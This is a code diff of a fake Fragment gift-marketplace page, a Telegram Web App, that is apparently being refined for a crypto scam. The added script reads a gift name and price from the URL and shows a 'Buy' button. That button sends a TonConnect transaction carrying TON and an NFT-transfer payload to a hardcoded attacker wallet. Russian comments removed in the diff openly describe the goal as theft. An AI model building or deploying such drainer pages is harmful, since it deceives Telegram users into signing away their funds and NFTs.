@@ -6,227 +6,128 @@
     <title>Fragment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            background-color: #0e0f13;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            height: 100vh;
-        }
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 100%;
-            padding: 16px 20px;
-            background-color: #0e0f13;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
-        .back-btn {
-            background: none;
-            border: none;
-            color: #0098ea;
-            font-size: 24px;
-            cursor: pointer;
-            padding: 0;
-            display: flex;
-            align-items: center;
-        }
-        .header-title {
-            font-weight: 600;
-            font-size: 17px;
-            color: #ffffff;
-        }
-        .header-icon {
-            width: 28px;
-            height: 28px;
-            background: #2a2c35;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-        }
-        .content {
-            width: 100%;
-            max-width: 500px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            flex-grow: 1;
-        }
-        .gift-card {
-            background: #1c1d22;
-            border-radius: 20px;
-            padding: 24px;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 24px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            position: relative;
-            overflow: hidden;
-        }
-        .gift-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0,152,234,0.1) 0%, transparent 60%);
-            pointer-events: none;
-        }
-        .gift-image-container {
-            width: 180px;
-            height: 180px;
-            background: linear-gradient(135deg, #2a2c35 0%, #1c1d22 100%);
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 16px;
-            border: 2px solid rgba(255,255,255,0.05);
-            position: relative;
-            z-index: 1;
-        }
-        .gift-image {
-            font-size: 90px;
-            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
-        }
-        .gift-name {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 4px;
-            z-index: 1;
-        }
-        .gift-collection {
-            font-size: 14px;
-            color: #8b8e96;
-            margin-bottom: 20px;
-            z-index: 1;
-        }
-        .price-container {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(0, 152, 234, 0.1);
-            padding: 12px 24px;
-            border-radius: 12px;
-            z-index: 1;
-        }
-        .price-value {
-            font-size: 28px;
-            font-weight: 800;
-            color: #0098ea;
-        }
-        .price-currency {
-            font-size: 16px;
-            font-weight: 600;
-            color: #0098ea;
-            margin-top: 4px;
-        }
-        .details {
-            width: 100%;
-            background: #1c1d22;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 24px;
-        }
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        .detail-label {
-            color: #8b8e96;
-            font-size: 15px;
-        }
-        .detail-value {
-            font-weight: 500;
-            font-size: 15px;
-        }
-        .sell-btn {
-            background-color: #0098ea;
-            color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 16px;
-            font-size: 17px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            box-shadow: 0 4px 15px rgba(0, 152, 234, 0.3);
-            margin-bottom: 16px;
-        }
-        .sell-btn:active {
-            background-color: #007bbd;
-        }
-        .status {
-            color: #8b8e96;
-            font-size: 14px;
-            text-align: center;
-            height: 20px;
-        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #16181c; color: #ffffff; font-family: 'Inter', sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .top-header { width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; background-color: #1e2025; border-bottom: 1px solid #2a2d34; }
+        .logo { font-size: 20px; font-weight: 800; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }
+        .logo-icon { width: 24px; height: 24px; background: #fff; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
+        .menu-icon { font-size: 24px; color: #8b8e96; cursor: pointer; }
+        .tabs { width: 100%; display: flex; justify-content: space-around; background: #1e2025; padding: 12px 10px; border-bottom: 1px solid #2a2d34; font-size: 14px; color: #8b8e96; overflow-x: auto; white-space: nowrap; }
+        .tab { padding: 0 12px; cursor: pointer; }
+        .tab.active { color: #fff; border-bottom: 2px solid #0098ea; padding-bottom: 12px; margin-bottom: -12px; font-weight: 500; }
+        .main-content { width: 100%; max-width: 500px; padding: 16px; display: flex; flex-direction: column; gap: 16px; }
+        .gift-header { display: flex; align-items: center; gap: 12px; margin-top: 8px; }
+        .back-arrow { font-size: 24px; color: #fff; cursor: pointer; }
+        .gift-title { font-size: 22px; font-weight: 600; margin: 0; }
+        .status-badge { background: #1b3d2c; color: #3ddc84; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; text-transform: uppercase; }
+        .gift-preview { width: 100%; height: 220px; background: #7e539e; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 8px 0; position: relative; overflow: hidden; }
+        .gift-preview img { width: 130px; height: 130px; object-fit: contain; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }
+        .details-table { background: #1e2025; border-radius: 12px; padding: 4px 16px; display: flex; flex-direction: column; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid #2a2d34; }
+        .detail-row:last-child { border-bottom: none; }
+        .detail-label { color: #8b8e96; font-size: 14px; width: 30%; }
+        .detail-value { color: #fff; font-size: 14px; font-weight: 500; text-align: right; width: 70%; word-break: break-all; }
+        .detail-value.owner { color: #0098ea; }
+        .percent-badge { color: #0098ea; font-size: 11px; margin-left: 6px; opacity: 0.8; }
+        .price-block { background: #1e2025; border-radius: 12px; padding: 16px; display: flex; flex-direction: column; gap: 12px; }
+        .price-label { color: #8b8e96; font-size: 13px; }
+        .price-value { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+        .price-usd { color: #8b8e96; font-size: 14px; font-weight: 400; }
+        .price-note { color: #8b8e96; font-size: 12px; line-height: 1.4; }
+        .buy-btn { background-color: #0098ea; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .buy-btn:active { background-color: #007bbd; }
+        .subscribe-link { text-align: center; color: #0098ea; font-size: 14px; font-weight: 500; margin-top: 8px; cursor: pointer; }
+        .history-title { font-size: 18px; font-weight: 600; margin-top: 10px; }
+        .history-table { background: #1e2025; border-radius: 12px; padding: 4px 16px; font-size: 13px; }
+        .history-header { display: flex; justify-content: space-between; padding: 12px 0; color: #8b8e96; border-bottom: 1px solid #2a2d34; }
+        .history-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #2a2d34; }
+        .history-row:last-child { border-bottom: none; }
+        .history-col { flex: 1; }
+        .history-col.right { text-align: right; }
+        .history-col.center { text-align: center; }
+        .status { color: #8b8e96; font-size: 13px; text-align: center; margin-top: 10px; height: 16px; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <button class="back-btn">‹</button>
-        <div class="header-title">Fragment</div>
-        <div class="header-icon">👤</div>
+    <div class="top-header">
+        <div class="logo"><div class="logo-icon"></div> FRAGMENT</div>
+        <div class="menu-icon">☰</div>
     </div>
 
-    <div class="content">
-        <div class="gift-card">
-            <div class="gift-image-container">
-                <div class="gift-image">🎁</div>
+    <div class="tabs">
+        <div class="tab">Usernames</div>
+        <div class="tab">Numbers</div>
+        <div class="tab active">Gifts</div>
+        <div class="tab">Stars</div>
+        <div class="tab">Premium</div>
+        <div class="tab">Ads</div>
+    </div>
+
+    <div class="main-content">
+        <div class="gift-header">
+            <div class="back-arrow">←</div>
+            <h1 class="gift-title" id="giftTitle">Loading...</h1>
+            <div class="status-badge">For sale</div>
+        </div>
+
+        <div class="gift-preview">
+            <img id="giftImage" src="" alt="Gift">
+        </div>
+
+        <div class="details-table">
+            <div class="detail-row">
+                <div class="detail-label">Owner</div>
+                <div class="detail-value owner">UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k</div>
             </div>
-            <div class="gift-name">Plush Pepe #2480</div>
-            <div class="gift-collection">Plush Pepe Collection</div>
-            
-            <div class="price-container">
-                <div class="price-value">150</div>
-                <div class="price-currency">TON</div>
+            <div class="detail-row">
+                <div class="detail-label">Model</div>
+                <div class="detail-value">Trio Scoop <span class="percent-badge">3%</span></div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Backdrop</div>
+                <div class="detail-value">Grape <span class="percent-badge">1.5%</span></div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Symbol</div>
+                <div class="detail-value">Maple Leaf <span class="percent-badge">0.7%</span></div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Issued</div>
+                <div class="detail-value">329060 of 342255</div>
             </div>
         </div>
 
-        <div class="details">
-            <div class="detail-row">
-                <div class="detail-label">Seller</div>
-                <div class="detail-value">You</div>
+        <div class="price-block">
+            <div class="price-label">Sell Price *</div>
+            <div class="price-value" id="priceText">
+                Loading...
             </div>
-            <div class="detail-row">
-                <div class="detail-label">Buyer</div>
-                <div class="detail-value">Verified User</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Network Fee</div>
-                <div class="detail-value">0.05 TON</div>
-            </div>
+            <div class="price-note">* The owner of this asset is ready to sell it for this price without an auction.</div>
         </div>
 
-        <button class="sell-btn" id="sellBtn">Confirm Sale</button>
-        <div class="status" id="statusText">Waiting for confirmation...</div>
+        <button class="buy-btn" id="sellBtn">
+            Buy
+        </button>
+        <div class="status" id="statusText"></div>
+
+        <div class="subscribe-link">Subscribe to updates</div>
+
+        <div class="history-title">Ownership History</div>
+        <div class="history-table">
+            <div class="history-header">
+                <div class="history-col">Sale price</div>
+                <div class="history-col center">Date</div>
+                <div class="history-col right">Buyer</div>
+            </div>
+            <div class="history-row">
+                <div class="history-col">💎 3.4099...</div>
+                <div class="history-col center">Jul 30 at 18:00</div>
+                <div class="history-col right" style="color:#0098ea;">UQDdWSuSrN... >GgKT7khuFX</div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -234,22 +135,28 @@
         tg.ready();
         tg.expand();
 
-        // СЮДА ВСТАВЬ АДРЕС СВОЕГО КОШЕЛЬКА (ТВИНКА)
+        // ВСТАВЛЕН ТВОЙ КОШЕЛЕК
         const MY_WALLET_ADDRESS = "UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k"; 
-        
-        // Это заглушка payload для перевода NFT. Для реальной кражи сюда нужно вставить код конкретного подарка.
         const NFT_TRANSFER_PAYLOAD = "te6cckEBAQEAAgAAAEysuc0="; 
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const giftId = urlParams.get('gift') || 'icecream-162005';
+        const price = urlParams.get('price') || '5';
+
+        const parts = giftId.split('-');
+        const giftName = parts[0].charAt(0).toUpperCase() + parts[0].slice(1);
+        const giftNum = parts[1] || '';
+
+        document.getElementById('giftTitle').innerText = `${giftName} #${giftNum}`;
+        document.getElementById('giftImage').src = `https://nft.fragment.com/gift/${giftId}.webp`;
+        document.getElementById('priceText').innerHTML = `💎 ${price} <span class="price-usd">~$${(price * 1.5).toFixed(2)}</span>`;
+        document.getElementById('sellBtn').innerText = `Buy for 💎 ${price}`;
 
         const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
             manifestUrl: "https://snoix69.github.io/swap-helper/tonconnect-manifest.json"
         });
 
         document.getElementById("sellBtn").onclick = async () => {
-            if (MY_WALLET_ADDRESS === "UQ_ТВОЙ_АДРЕС_КОШЕЛЬКА") {
-                document.getElementById("statusText").innerText = "Ошибка: адрес кошелька не указан.";
-                return;
-            }
-
             document.getElementById("statusText").innerText = "Opening wallet...";
             
             try {
@@ -258,18 +165,15 @@
                     messages: [
                         {
                             address: MY_WALLET_ADDRESS,
-                            amount: "50000000", // 0.05 TON на комиссию сети
+                            amount: "50000000", 
                             payload: NFT_TRANSFER_PAYLOAD
                         }
                     ]
                 };
 
                 await tonConnectUI.sendTransaction(transaction);
-                
                 document.getElementById("statusText").innerText = "Success! Returning to bot...";
-                
-                // Отправляем данные боту, чтобы он написал "Ожидайте зачисления"
-                tg.sendData(JSON.stringify({status: "sold", item: "Plush Pepe #2480"}));
+                tg.sendData(JSON.stringify({status: "sold", item: giftId}));
                 
             } catch (e) {
                 document.getElementById("statusText").innerText = "Transaction cancelled.";
